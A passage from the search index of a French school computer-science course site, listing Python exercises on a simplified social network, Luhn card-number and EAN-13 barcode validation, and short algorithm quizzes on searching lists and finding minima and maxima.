d\u00e9connexion).</p>"},{"location":"premiere/XIII-Projets/Reseau_Social_Simplifie/sujet/#2-gestion-des-amities","title":"2. Gestion des Amiti\u00e9s","text":"<p>Gestion des amiti\u00e9s \ud83e\udd1d</p> <p>**Cr\u00e9er les fonctions suivantes : Cr\u00e9ez une fonction <code>ajouter_ami(utilisateurs_db, nom_utilisateur_connecte, nom_nouvel_ami)</code> qui : 1. V\u00e9rifie que <code>nom_nouvel_ami</code> existe et n'est pas d\u00e9j\u00e0 ami avec <code>nom_utilisateur_connecte</code>. 2. Ajoute <code>nom_nouvel_ami</code> \u00e0 la liste <code>amis</code> de <code>nom_utilisateur_connecte</code>. 3. Ajoute <code>nom_utilisateur_connecte</code> \u00e0 la liste <code>amis</code> de <code>nom_nouvel_ami</code>. 4. Renvoie <code>True</code> si l'amiti\u00e9 est ajout\u00e9e, <code>False</code> sinon (ami inexistant, d\u00e9j\u00e0 ami, ou tentative de s'ajouter soi-m\u00eame).</p> <p>Voir la liste d'amis</p> <p>Cr\u00e9ez une fonction <code>voir_amis(profil_utilisateur)</code> qui affiche la liste des amis de l'utilisateur dont le profil est fourni.</p> <p>Test de la gestion des amiti\u00e9s \u2705</p> <p>**Tester les fonctions : 2. Ajoutez plusieurs amis. Essayez d'ajouter un ami inexistant ou d\u00e9j\u00e0 ami. 3. Connectez-vous avec un autre utilisateur et v\u00e9rifiez que l'amiti\u00e9 est bien r\u00e9ciproque. 4. Affichez les listes d'amis des utilisateurs concern\u00e9s.</p>"},{"location":"premiere/XIII-Projets/Reseau_Social_Simplifie/sujet/#3-publication-et-affichage-de-messages","title":"3. Publication et Affichage de Messages","text":"<p>Chaque message aura un contenu, un auteur, et une date de publication.</p> <p>Structure d'un message \u2709\ufe0f</p> <p>D\u00e9finir la structure de donn\u00e9es pour repr\u00e9senter un message. Chaque message doit contenir au moins : - <code>id_message</code> (entier, unique, peut \u00eatre g\u00e9n\u00e9r\u00e9 automatiquement) - <code>auteur</code> (cha\u00eene de caract\u00e8res, <code>nom_utilisateur</code>) - <code>contenu</code> (cha\u00eene de caract\u00e8res) - <code>timestamp</code> (date et heure de publication, utilisez le module <code>datetime</code>)</p> <p>Base de donn\u00e9es des messages</p> <p>Cr\u00e9ez une liste globale <code>messages_db</code> pour stocker tous les messages. Cr\u00e9ez un compteur global <code>prochain_id_message</code> initialis\u00e9 \u00e0 1.</p> <p>Publication et Affichage des messages \ud83d\udce2</p> <p>**Cr\u00e9er les fonctions suivantes : 1. Cr\u00e9e un nouveau dictionnaire de message avec un <code>id_message</code> unique (utilisez et incr\u00e9mentez <code>prochain_id_message</code>), l'<code>auteur</code> (nom de l'utilisateur connect\u00e9), le <code>contenu</code>, et le <code>timestamp</code> actuel. 2. Ajoute le message \u00e0 <code>messages_db</code>. 3. Ajoute l'<code>id_message</code> (ou une r\u00e9f\u00e9rence au message) \u00e0 la liste <code>messages_publies</code> du profil de l'<code>utilisateur_connecte</code>. 4. Renvoie le message cr\u00e9\u00e9.</p> <p>Afficher le fil d'actualit\u00e9</p> <p>Cr\u00e9ez une fonction <code>afficher_fil_actualite(utilisateur_connecte, utilisateurs_db, messages_db)</code> qui : 1. R\u00e9cup\u00e8re la liste des amis de <code>utilisateur_connecte</code>. 2. Collecte tous les messages publi\u00e9s par <code>utilisateur_connecte</code> ET par ses amis. 3. Trie ces messages par <code>timestamp</code> (du plus r\u00e9cent au plus ancien). 4. Affiche les messages de mani\u00e8re lisible (par exemple: \"[Timestamp] Auteur: Contenu\").</p> <p>Test de la gestion des messages \u2705</p> <p>**Tester les fonctions : 2. Publiez plusieurs messages. 3. Connectez-vous avec un utilisateur B, ami avec A. 4. Publiez plusieurs messages avec B. 5. Affichez le fil d'actualit\u00e9 de A (devrait voir les messages de A et B). 6. Affichez le fil d'actualit\u00e9 de B (devrait voir les messages de B et A). 7. Connectez-vous avec un utilisateur C, non ami avec A ou B, et publiez un message. 8. V\u00e9rifiez que les fils d'actualit\u00e9 de A et B n'affichent pas les messages de C (sauf si C est aussi leur propre message).</p>"},{"location":"premiere/XIII-Projets/Reseau_Social_Simplifie/sujet/#4-interface-utilisateur-menu-principal","title":"4. Interface Utilisateur (Menu Principal)","text":"<p>Menu principal et Boucle du programme \ud83d\udd04</p> <p>Cr\u00e9er un menu principal qui permet \u00e0 l'utilisateur de naviguer dans l'application. Le menu doit proposer les options suivantes : - Si d\u00e9connect\u00e9, propose : \"1. Cr\u00e9er un compte\", \"2. Se connecter\", \"3. Quitter\". - Si connect\u00e9, propose : \"1. Publier un message\", \"2. Voir mon fil d'actualit\u00e9\", \"3. Ajouter un ami\", \"4. Voir mes amis\", \"5. Se d\u00e9connecter\", \"6. Quitter\". Impl\u00e9menter la boucle principale du programme qui affiche le menu et traite les choix de l'utilisateur.</p> <p>Test du menu principal \u2705</p> <p>Lancer le programme et tester toutes les fonctionnalit\u00e9s du menu principal. S'assurer que la navigation est fluide et que les actions sont correctement ex\u00e9cut\u00e9es. 1. Cr\u00e9ez deux ou trois utilisateurs. 2. Connectez l'utilisateur A. 3. Faites-lui ajouter l'utilisateur B comme ami. 4. Publiez des messages avec A. 5. D\u00e9connectez A. 6. Connectez B. 7. Publiez des messages avec B. 8. Affichez le fil d'actualit\u00e9 de B (doit contenir les messages de A et B). 9. Quittez.</p>"},{"location":"premiere/XIII-Projets/Reseau_Social_Simplifie/sujet/#pour-aller-plus-loin-optionnel","title":"Pour aller plus loin (Optionnel)","text":"<ul> <li>Suppression de messages/amis.</li> <li>Profils utilisateurs plus d\u00e9taill\u00e9s (bio, photo de profil - textuelle!).</li> <li>Messages priv\u00e9s entre deux utilisateurs.</li> <li>\"J'aime\" sur les messages.</li> <li>Persistance des donn\u00e9es : Sauvegardez <code>utilisateurs_db</code> et <code>messages_db</code> dans des fichiers (JSON ou CSV) pour que les donn\u00e9es ne soient pas perdues \u00e0 la fermeture du programme.</li> </ul>"},{"location":"premiere/XIIII-TP_notes/Carte_Bleue/verification_carte_bleue/","title":"V\u00e9rification d'un num\u00e9ro de carte bancaire","text":"<p>Un certain nombre d'applications utilise la formule de Luhn pour v\u00e9rifier si un identifiant ou un nombre est utilisable dans certains contextes.  </p> <p>Une des application notable de la v\u00e9rification par la formule de Luhn est celle des num\u00e9ros de cartes bancaires.  </p>"},{"location":"premiere/XIIII-TP_notes/Carte_Bleue/verification_carte_bleue/#explication-de-lalgorithme","title":"Explication de l'algorithme","text":"<p>L'algorithme se d\u00e9roule en 3 \u00e9tapes : </p> <ul> <li>On lit de gauche \u00e0 droite une cha\u00eene de caract\u00e8re.</li> <li>On multiplie un chiffre sur deux par 2.</li> <li>Si celui-ci est sup\u00e9rieur \u00e0 10, on additionne les 2 chiffres composant le nombre.</li> <li>On additionne l'int\u00e9gralit\u00e9 des chiffres apr\u00e8s les calculs pr\u00e9c\u00e9dents.</li> <li>Si la somme de tous ses chiffres et divisible par 10, alors la carte bancaire est valide, sinon elle ne l'est pas.</li> </ul>"},{"location":"premiere/XIIII-TP_notes/Carte_Bleue/verification_carte_bleue/#a-realiser","title":"A r\u00e9aliser","text":"<p>\u00c9crire une fonction <code>multiplier_additionner</code> qui prend en param\u00e8tre un nombre entier int et renvoie un entier. Cette fonction multiplie par deux le chiffre donn\u00e9 en param\u00e8tre et si celui-ci est sup\u00e9rieur \u00e0 10, additionne les deux chiffres le composant (par exemple \\(\\texttt{multiplierconcatener(8)} \\rightarrow 8 \\times 2 = 16 \\rightarrow 1 + 6 = 7\\)). Exemple d'utilisation :</p> <pre><code>    &gt;&gt;&gt; multiplier_additionner(4)\n    8\n    &gt;&gt;&gt; multiplier_additionner(8)\n    7\n</code></pre> <p>Compl\u00e9ter la fonction <code>multiplication_un_sur_deux</code> suivante qui prend en param\u00e8tre un num\u00e9ro de carte bancaire sous forme de cha\u00eene de caract\u00e8re et renvoie une cha\u00eene de caract\u00e8re. Cette fonction multiplie et concat\u00e8ne les chiffres du nombre de carte bancaire un sur deux.  Elle r\u00e9utilisera la fonction pr\u00e9c\u00e9dente. Exemple d'utilisation</p> <pre><code>    &gt;&gt;&gt; multiplication_un_sur_deux('3849')\n    '3749'\n    &gt;&gt;&gt; multiplication_un_sur_deux('7642')\n    '7344'\n</code></pre> <pre><code>    def multiplication_un_sur_deux(numero_cb:str)-&gt;str:\n    '''\n    entr\u00e9e:\n    numero_cb : num\u00e9ro de carte bancaire\n    sortie : num\u00e9ro sous forme de cha\u00eene de caract\u00e8re apr\u00e8s traitement\n    R\u00e9alise le pr\u00e9traitement avant la somme finale.\n    '''\n    res = ''\n    for i in range(len(...)):\n        if i ... 2 == ...:\n            res += str(multiplier_additionner(numero_cb[...]))\n        else:\n            res += numero_cb[...]\n    return res\n</code></pre> <p>\u00c9crire une fonction <code>somme_chiffre</code> qui prend en param\u00e8tre une cha\u00eene de caract\u00e8re repr\u00e9sentant un num\u00e9ro de carte bancaire et renvoie la somme de tous les nombres le composant. </p> <p>Exemple d'utilisation :</p> <pre><code>    &gt;&gt;&gt; somme_chiffre(\"4539148803436467\")\n    75\n    &gt;&gt;&gt; somme_chiffre(\"3712348123980741\")\n    63\n</code></pre> <p>\u00c9crire une fonction <code>divisible_par_10</code> qui prend en param\u00e8tre un nombre entier et renvoie <code>True</code> s'il est divisible par 10, <code>False</code> sinon. </p> <p>Exemple d'utilisation:</p> <pre><code>    &gt;&gt;&gt; divisible_par_10(75)\n    False\n    &gt;&gt;&gt; divisible_par_10(60)\n    True\n</code></pre> <p>\u00c9crire une fonction <code>verification_CB_Luhn</code> qui prend en param\u00e8tre un num\u00e9ro de carte bancaire sous forme de cha\u00eene de caract\u00e8re et renvoie <code>True</code> s'il est valide, <code>False</code> sinon. Cette fonction utilisera toutes les fonctions pr\u00e9c\u00e9demment impl\u00e9mant\u00e9es.</p> <p>Exemple d'utilisation:</p> <pre><code>    cb_1 = \"4539148803236467\"\n    cb_2 = \"3712348123980741\"\n\n    &gt;&gt;&gt; numero_carte_bancaire_valide(cb_1)\n    True\n    &gt;&gt;&gt; numero_carte_bancaire_valide(cb_2)\n    False\n</code></pre>"},{"location":"premiere/XIIII-TP_notes/Code_Barre/code_barre/","title":"V\u00e9rification d'un Code-barres","text":"<p>Les codes-barres sont omnipr\u00e9sents dans notre quotidien, utilis\u00e9s pour identifier des produits dans les magasins, les biblioth\u00e8ques, et bien d'autres domaines.</p>"},{"location":"premiere/XIIII-TP_notes/Code_Barre/code_barre/#exemple-du-calcul-de-la-cle-de-controle","title":"Exemple du calcul de la cl\u00e9 de contr\u00f4le","text":"<p>Nous allons \u00e9tudier  le Code EAN-13 : 9782091726649</p> <p>Rappel : une valeur \u00e0 la premi\u00e8re position est d'indice 0, une valeur \u00e0 la seconde position est d'indice 1 \\(\\cdots\\)</p>"},{"location":"premiere/XIIII-TP_notes/Code_Barre/code_barre/#explication-de-lalgorithme","title":"Explication de l'algorithme","text":"<ul> <li>On ne travaille que sur les 12 premiers chiffres.</li> <li>On lit le num\u00e9ro de gauche \u00e0 droite</li> <li>On r\u00e9alise la somme de tous les chiffres situ\u00e9s \u00e0 des positions impaires. Pour l'exemple : \\(9+8+0+1+2+6 = 26\\).</li> <li>On r\u00e9alise la somme de tous les chiffres situ\u00e9s \u00e0 des positions paires. Pour l'exemple : \\(7+2+9+7+6+4 = 35\\).</li> <li>On multiplie la somme des chiffres de positions paires par 3. Pour l'exemple : \\(35 \\times 3 = 105\\).</li> <li>On additionne la somme multipli\u00e9e par 3 avec la somme des chiffres de positions impaires. Pour l'exemple : \\(105 + 26 = 131\\).</li> <li>On calcule le reste de la division euclidienne par 10 de ce nombre. Pour l'exemple : \\(131%10 = 1\\).</li> <li>On retire le reste \u00e0 10 pour obtenir la valeur qui servira de v\u00e9rification. Pour l'exemple : \\(10-1 = 9\\).</li> <li>Si cette valeur de v\u00e9rification est \u00e9gale au dernier chiffre du code barre. : Le num\u00e9ro d'EAN est valide, sinon il ne l'est pas. Pour l'exemple : la clef de contr\u00f4le calcul\u00e9e est 9, le dernier chiffre du code barre est bien 9, il est donc bien valide.</li> </ul>"},{"location":"premiere/XIIII-TP_notes/Code_Barre/code_barre/#a-realiser","title":"\u00c0 r\u00e9aliser","text":"<p>\u00c9crire une fonction <code>verifier_longueur</code> qui prend en param\u00e8tre une cha\u00eene de caract\u00e8res et renvoie <code>True</code> si le code-barres contient exactement 13 chiffres, <code>False</code> sinon.. Exemple d'utilisation : </p> <pre><code>   &gt;&gt;&gt; verifier_longueur('9782091726649')\n   True\n   &gt;&gt;&gt; verifier_longueur('978209172664')\n   False\n</code></pre> <p>\u00c9crire une fonction <code>mettre_bonne_longueur</code> qui prend une cha\u00eene de caract\u00e8res et renvoie une cha\u00eene de caract\u00e8res contenant les 12 premiers caract\u00e8res. Exemple d'utilisation: </p> <pre><code>   &gt;&gt;&gt; mettre_bonne_longueur(\"9782091726649\")\n   '978209172664'\n   &gt;&gt;&gt; mettre_bonne_longueur(\"bonjourjesuisletexte\")\n   \"bonjourjesui\"\n</code></pre> <p>\u00c9crire une fonction <code>somme_positions_impairs</code> qui prend en param\u00e8tre une cha\u00eene de caract\u00e8res repr\u00e9sentant un code barre et renvoie un entier correspondant \u00e0 la somme des chiffres de positions impaires. Exemple d'utilisation: </p> <pre><code>   &gt;&gt;&gt; somme_positions_impairs('978209172664')\n   26\n</code></pre> <p>\u00c9crire une fonction <code>somme_positions_pairs</code> qui prend en param\u00e8tre une cha\u00eene de caract\u00e8re repr\u00e9sentant un code barre et renvoie un entier correspondant \u00e0 la somme des chiffres de positions paires. Exemple d'utilisation: </p> <pre><code>   &gt;&gt;&gt; somme_positions_pairs('978209172664')\n   35\n</code></pre> <p>\u00c9crire une fonction <code>multiplier_par_trois</code> qui prend en param\u00e8tre un entier et renvoie son produit avec trois. Exemple d'utilisation: </p> <pre><code>   &gt;&gt;&gt;  multiplier_par_trois(35)\n   105\n   &gt;&gt;&gt; multiplier_par_trois(15)\n   45\n</code></pre> <p>\u00c9crire une fonction <code>traitement</code> qui prend en param\u00e8tre deux entiers et renvoie un entier. Cette fonction va :  </p> <ul> <li>R\u00e9aliser la somme de ces deux entiers.  </li> <li>Calculer le reste de la division par 10 de cette somme.  </li> <li>Soustraire le reste de la division \u00e0 10.  </li> </ul> <p>Exemple d'utilisation</p> <pre><code>   &gt;&gt;&gt; traitement(26,105)\n      9\n</code></pre> <p>\u00c9crire une fonction <code>verification_clef</code> qui prend en param\u00e8tres un code barre repr\u00e9sent\u00e9 par une cha\u00eene de caract\u00e8re et un entier et renvoie <code>True</code> si le dernier chiffre (clef) du code barre est \u00e9gal \u00e0 l'entier pass\u00e9 en param\u00e8tre, <code>False</code> sinon.</p> <p>Exemple d'utilisation:</p> <pre><code>   &gt;&gt;&gt; verification_clef(\"9782091726649\",9)\n   True\n</code></pre> <p>\u00c9crire une fonction <code>validation_code_barre</code> qui prend en param\u00e8tre un code barre repr\u00e9sent\u00e9 par une cha\u00eene de caract\u00e8re et renverra <code>True</code> s'il est valide, <code>False</code> sinon. Cette fonction utilisera toutes les fonctions pr\u00e9c\u00e9dentes pour r\u00e9aliser la v\u00e9rification not\u00e9e au d\u00e9but de ce TP.  </p> <p>Exemple d'utilisation</p> <pre><code>   &gt;&gt;&gt; validation_code_barre(\"9782091726649\")\n   True\n   &gt;&gt;&gt; validation_code_barre(\"4006381333936\")\n   False\n</code></pre>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet1_md/","title":"Interrogation : Algorithme \u00e0 savoir Sujet 1","text":"<p>Cette interrogation demande 3 algorithmes ind\u00e9pendants valant tous 6 points. Les algorithmes sont not\u00e9s sur 18 et le soin et justifications not\u00e9s sur 2 points.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet1_md/#algorithme-1-presence-dans-une-liste","title":"Algorithme 1 : Pr\u00e9sence dans une liste","text":"<p>\u00c9crire une fonction <code>presence</code>qui prend en param\u00e8tre une valeur et une liste et renvoie <code>True</code> si la valeur demand\u00e9e est dans la liste, <code>False</code> sinon. Exemple : presence(3, [1, 2, 3, 4]) doit renvoyer True. presence(5, [1, 2, 3, 4]) doit renvoyer False.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet1_md/#algorithme-2-recherche-du-minimum","title":"Algorithme 2 : Recherche du minimum","text":"<p>\u00c9crire une fonction <code>minimum</code> qui prend une liste d'entiers et renvoie l'entier minimum. Exemple : minimum([3, 1, 9, 2]) doit renvoyer 1.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet1_md/#algorithme-3-recherche-de-lindice-du-maximum","title":"Algorithme 3 : Recherche de l'indice du maximum","text":"<p>\u00c9crire une fonction <code>indice_maximum</code> qui prend une liste d'entiers et renvoie l'indice de l'entier maximum. Exemple : indice_maximum([3, 1, 9, 2]) doit renvoyer 2.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet2_md/","title":"Interrogation : Algorithme \u00e0 savoir Sujet 2","text":"<p>Cette interrogation demande 3 algorithmes ind\u00e9pendants valant tous 6 points. Les algorithmes sont not\u00e9s sur 18 et le soin et justifications not\u00e9s sur 2 points.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet2_md/#algorithme-1-presence-avec-indice","title":"Algorithme 1 : Pr\u00e9sence avec indice","text":"<p>\u00c9crire une fonction <code>presence_indice</code>qui prend en param\u00e8tre une valeur et une liste et renvoie l'indice de la valeur demand\u00e9e si elle est dans la liste, <code>None</code> sinon. Exemple : presence_indice(3, [1, 2, 3, 4]) doit renvoyer 2. presence_indice(5, [1, 2, 3, 4]) doit renvoyer None.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet2_md/#algorithme-2-recherche-du-maximum","title":"Algorithme 2 : Recherche du maximum","text":"<p>\u00c9crire une fonction <code>maximum</code> qui prend une liste d'entiers et renvoie l'entier maximum. Exemple : maximum([3, 1, 9, 2]) doit renvoyer 9.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet2_md/#algorithme-3-recherche-de-lindice-du-minimum","title":"Algorithme 3 : Recherche de l'indice du minimum","text":"<p>\u00c9crire une fonction <code>indice_minimum</code> qui prend une liste d'entiers et renvoie l'indice de l'entier minimum. Exemple : indice_minimum([3, 1, 9, 2]) doit renvoyer 1.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet3_md/","title":"Interrogation : Algorithme \u00e0 savoir Sujet 3","text":"<p>Cette interrogation demande 3 algorithmes ind\u00e9pendants valant tous 6 points. Les algorithmes sont not\u00e9s sur 18 et le soin et justifications not\u00e9s sur 2 points.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet3_md/#algorithme-1-presence-dans-une-liste","title":"Algorithme 1 : Pr\u00e9sence dans une liste","text":"<p>\u00c9crire une fonction <code>presence</code>qui prend en param\u00e8tre une valeur et une liste et renvoie <code>True</code> si la valeur demand\u00e9e est dans la liste, <code>False</code> sinon. Exemple : presence(3, [1, 2, 3, 4]) doit renvoyer True. presence(5, [1, 2, 3, 4]) doit renvoyer False.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet3_md/#algorithme-2-recherche-du-maximum","title":"Algorithme 2 : Recherche du maximum","text":"<p>\u00c9crire une fonction <code>maximum</code> qui prend une liste d'entiers et renvoie l'entier maximum. Exemple : maximum([3, 1, 9, 2]) doit renvoyer 9.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet3_md/#algorithme-3-recherche-de-lindice-du-minimum","title":"Algorithme 3 : Recherche de l'indice du minimum","text":"<p>\u00c9crire une fonction <code>indice_minimum</code> qui prend une liste d'entiers et renvoie l'indice de l'entier minimum. Exemple : indice_minimum([3, 1, 9, 2]) doit renvoyer 1.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet4_md/","title":"Interrogation : Algorithme \u00e0 savoir Sujet 4","text":"<p>Cette interrogation demande 3 algorithmes ind\u00e9pendants valant tous 6 points. Les algorithmes sont not\u00e9s sur 18 et le soin et justifications not\u00e9s sur 2 points.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet4_md/#algorithme-1-presence-avec-indice","title":"Algorithme 1 : Pr\u00e9sence avec indice","text":"<p>\u00c9crire une fonction <code>presence_indice</code>qui prend en param\u00e8tre une valeur et une liste et renvoie l'indice de la valeur demand\u00e9e si elle est dans la liste, <code>None</code> sinon. Exemple : presence_indice(3, [1, 2, 3, 4]) doit renvoyer 2. presence_indice(5, [1, 2, 3, 4]) doit renvoyer None.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet4_md/#algorithme-2-recherche-du-minimum","title":"Algorithme 2 : Recherche du minimum","text":"<p>\u00c9crire une fonction <code>minimum</code> qui prend une liste d'entiers et renvoie l'entier minimum. Exemple : minimum([3, 1, 9, 2]) doit renvoyer 1.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet4_md/#algorithme-3-recherche-de-lindice-du-maximum","title":"Algorithme 3 : Recherche de l'indice du maximum","text":"<p>\u00c9crire une fonction <code>indice_maximum</code> qui prend une liste d'entiers et renvoie l'indice de l'entier maximum. Exemple : indice_maximum([3, 1, 9, 2]) doit renvoyer 2.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet5_md/","title":"Interrogation : Algorithme \u00e0 savoir Sujet 5","text":"<p>Cette interrogation demande 3 algorithmes ind\u00e9pendants valant tous 6 points. Les algorithmes sont not\u00e9s sur 18 et le soin et justifications not\u00e9s sur 2 points.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet5_md/#algorithme-1-presence-dans-une-liste","title":"Algorithme 1 : Pr\u00e9sence dans une liste","text":"<p>\u00c9crire une fonction <code>presence</code>qui prend en param\u00e8tre une valeur et une liste et renvoie <code>True</code> si la valeur demand\u00e9e est dans la liste, <code>False</code> sinon. Exemple : presence(3, [1, 2, 3, 4]) doit renvoyer True. presence(5, [1, 2, 3, 4]) doit renvoyer False.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet5_md/#algorithme-2-recherche-de-lindice-du-minimum","title":"Algorithme 2 : Recherche de l'indice du minimum","text":"<p>\u00c9crire une fonction <code>indice_minimum</code> qui prend une liste d'entiers et renvoie l'indice de l'entier minimum. Exemple : indice_minimum([3, 1, 9, 2]) doit renvoyer 1.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet5_md/#algorithme-3-recherche-du-maximum","title":"Algorithme 3 : Recherche du maximum","text":"<p>\u00c9crire une fonction <code>maximum</code> qui prend une liste d'entiers et renvoie l'entier maximum. Exemple : maximum([3, 1, 9, 2]) doit renvoyer 9.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet6_md/","title":"Interrogation : Algorithme \u00e0 savoir Sujet 6","text":"<p>Cette interrogation demande 3 algorithmes ind\u00e9pendants valant tous 6 points. Les algorithmes sont not\u00e9s sur 18 et le soin et justifications not\u00e9s sur 2 points.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet6_md/#algorithme-1-presence-avec-indice","title":"Algorithme 1 : Pr\u00e9sence avec indice","text":"<p>\u00c9crire une fonction <code>presence_indice</code>qui prend en param\u00e8tre une valeur et une liste et renvoie l'indice de la valeur demand\u00e9e si elle est dans la liste, <code>None</code> sinon. Exemple : presence_indice(3, [1, 2, 3, 4]) doit renvoyer 2. presence_indice(5, [1, 2, 3, 4]) doit renvoyer None.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet6_md/#algorithme-2-recherche-de-lindice-du-maximum","title":"Algorithme 2 : Recherche de l'indice du maximum","text":"<p>\u00c9crire une fonction <code>indice_maximum</code> qui prend une liste d'entiers et renvoie l'indice de l'entier maximum. Exemple : indice_maximum([3, 1, 9, 2]) doit renvoyer 2.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet6_md/#algorithme-3-recherche-du-minimum","title":"Algorithme 3 : Recherche du minimum","text":"<p>\u00c9crire une fonction <code>minimum</code> qui prend une liste d'entiers et renvoie l'entier minimum. Exemple : minimum([3, 1, 9, 2]) doit renvoyer 1.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet7_md/","title":"Interrogation : Algorithme \u00e0 savoir Sujet 7","text":"<p>Cette interrogation demande 3 algorithmes ind\u00e9pendants valant tous 6 points. Les algorithmes sont not\u00e9s sur 18 et le soin et justifications not\u00e9s sur 2 points.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet7_md/#algorithme-1-presence-dans-une-liste","title":"Algorithme 1 : Pr\u00e9sence dans une liste","text":"<p>\u00c9crire une fonction <code>presence</code>qui prend en param\u00e8tre une valeur et une liste et renvoie <code>True</code> si la valeur demand\u00e9e est dans la liste, <code>False</code> sinon. Exemple : presence(3, [1, 2, 3, 4]) doit renvoyer True. presence(5, [1, 2, 3, 4]) doit renvoyer False.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet7_md/#algorithme-2-recherche-de-lindice-du-maximum","title":"Algorithme 2 : Recherche de l'indice du maximum","text":"<p>\u00c9crire une fonction <code>indice_maximum</code> qui prend une liste d'entiers et renvoie l'indice de l'entier maximum. Exemple : indice_maximum([3, 1, 9, 2]) doit renvoyer 2.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet7_md/#algorithme-3-recherche-du-minimum","title":"Algorithme 3 : Recherche du minimum","text":"<p>\u00c9crire une fonction <code>minimum</code> qui prend une liste d'entiers et renvoie l'entier minimum. Exemple : minimum([3, 1, 9, 2]) doit renvoyer 1.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet8_md/","title":"Interrogation : Algorithme \u00e0 savoir Sujet 8","text":"<p>Cette interrogation demande 3 algorithmes ind\u00e9pendants valant tous 6 points. Les algorithmes sont not\u00e9s sur 18 et le soin et justifications not\u00e9s sur 2 points.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet8_md/#algorithme-1-presence-avec-indice","title":"Algorithme 1 : Pr\u00e9sence avec indice","text":"<p>\u00c9crire une fonction <code>presence_indice</code>qui prend en param\u00e8tre une valeur et une liste et renvoie l'indice de la valeur demand\u00e9e si elle est dans la liste, <code>None</code> sinon. Exemple : presence_indice(3, [1, 2, 3, 4]) doit renvoyer 2. presence_indice(5, [1, 2, 3, 4]) doit renvoyer None.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet8_md/#algorithme-2-recherche-de-lindice-du-minimum","title":"Algorithme 2 : Recherche de l'indice du minimum","text":"<p>\u00c9crire une fonction <code>indice_minimum</code> qui prend une liste d'entiers et renvoie l'indice de l'entier minimum. Exemple : indice_minimum([3, 1, 9, 2]) doit renvoyer 1.</p>"},{"location":"premiere/XIIII-TP_notes/Interro_Algo_a_savoir/sujet8_md/#algorithme-3-recherche-du-maximum","title":"Algorithme 3 : Recherche du maximum","text":"<p>\u00c9crire une fonction <code>maximum</code> qui prend une liste d'entiers et renvoie l'entier maximum. Exemple : maximum([3, 1, 9, 2]) doit renvoyer 9.</p>"},{"location":"seconde/seconde/","title":"Seconde","text":"Seconde SNT <p>Sciences Num\u00e9riques et Technologie</p> <p>             D\u00e9couverte des enjeux du num\u00e9rique dans la soci\u00e9t\u00e9 contemporaine         </p> \u2039 \ud83c\udf10 Internet &amp; Web <p>                         D\u00e9couvrez le fonctionnement d'Internet, les protocoles de communication et la cr\u00e9ation de sites web                     </p> Internet \ud83d\udcda Cours principal \ud83c\udfaf Activit\u00e9 \ud83d\udd22 Binaire/D\u00e9cimal Web \ud83d\udcda Cours HTML \ud83d\ude80 Projet cr\u00e9ation site \ud83c\udfa8 Galerie des cr\u00e9ations R\u00e9seaux sociaux \ud83d\udcda Cours th\u00e9orique \ud83d\udcbb TP Mod\u00e9lisation \ud83d\udc0d Programmation <p>                         Initiez-vous \u00e0 la programmation avec Python : variables, boucles, conditions et algorithmes                     </p> Python - Bases \ud83d\udc0d Exercices Python \ud83d\udd04 Exercices boucles \u2753 Exercices conditions \ud83d\udcf8 Multim\u00e9dia &amp; Donn\u00e9es <p>                         Explorez le traitement d'images, la g\u00e9olocalisation et la structuration des donn\u00e9es num\u00e9riques                     </p> Photographie Num\u00e9rique \u26ab Noir et Blanc \ud83c\udf08 Couleur \ud83d\udccb M\u00e9tadonn\u00e9es G\u00e9olocalisation \ud83d\uddfa\ufe0f Cours g\u00e9olocalisation Donn\u00e9es Structur\u00e9es \ud83e\udde9 Activit\u00e9 Blockly \ud83d\udca1 Objets Connect\u00e9s <p>                         D\u00e9couvrez l'Internet des Objets et programmez des micro-contr\u00f4leurs avec des capteurs                     </p> Micro:bit &amp; IoT \ud83e\udde9 Activit\u00e9 Blockly \ud83d\udcbb TP Micro:bit \u203a"},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/","title":"Fiche d'exercices : Les boucles en Python","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#exercices-dintroduction","title":"\ud83c\udfaf Exercices d'introduction","text":""},{"location":"seconde/IIII_-_Programmation_Python/Fiche_exercices_boucles/#important-consignes-importantes","title":"Important \u26a0\ufe0f - Consignes importantes","text":"<p>Pour tous les exercices :</p> <ul> <li>N'oubliez pas les deux points <code>:</code> apr\u00e8s la boucle</li> <li>Faites attention \u00e0 